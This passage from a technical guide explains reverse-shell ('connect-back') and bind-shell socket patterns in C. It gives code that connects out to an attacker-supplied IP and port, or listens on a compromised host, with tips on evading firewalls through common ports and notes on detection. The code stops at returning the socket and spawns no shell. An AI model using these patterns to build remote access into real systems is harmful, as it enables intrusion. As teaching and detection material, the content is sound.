## 1. Socket Programming Patterns

### 1.1 Connect-Back Pattern

**Architecture:**
```c
// Attacker machine: listening on port 4444
// Target machine: initiates outbound connection

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int create_reverse_shell(const char *attacker_ip, int attacker_port) {
    int sock;
    struct sockaddr_in sa;

    // Create TCP socket
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) {
        perror("socket");
        return -1;
    }

    // Configure target address
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(attacker_port);

    // Convert IP address
    if (inet_pton(AF_INET, attacker_ip, &sa.sin_addr) <= 0) {
        perror("inet_pton");
        close(sock);
        return -1;
    }

    // Attempt connection with retry logic
    int retries = 3;
    while (retries--) {
        if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) == 0) {
            return sock;  // Success
        }
        sleep(5);  // Backoff before retry
    }

    close(sock);
    return -1;
}
```

**Key characteristics:**
- Outbound TCP connection from compromised host
- Attacker controls connection timing
- Firewall evasion: often uses common ports (80, 443, 53)
- Detection: monitor outbound connections to unusual destinations

### 1.2 Bind Pattern

```c
int create_bind_shell(int listen_port) {
    int server_sock, client_sock;
    struct sockaddr_in sa;
    socklen_t sa_len;

    // Create listening socket
    server_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    // Allow address reuse
    int reuse = 1;
    setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, 
               &reuse, sizeof(reuse));

    // Bind to port
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = htonl(INADDR_ANY);  // Listen on all interfaces
    sa.sin_port = htons(listen_port);

    if (bind(server_sock, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("bind");
        return -1;
    }

    // Listen for connections
    listen(server_sock, 1);

    // Accept incoming connection
    sa_len = sizeof(sa);
    client_sock = accept(server_sock, (struct sockaddr *)&sa, &sa_len);

    close(server_sock);
    return client_sock;
}
```

**Characteristics:**
- Passive listening on compromised host
- Attacker initiates inbound connection
- Detection: netstat/ss shows listening port
- More easily detected but doesn't require outbound access

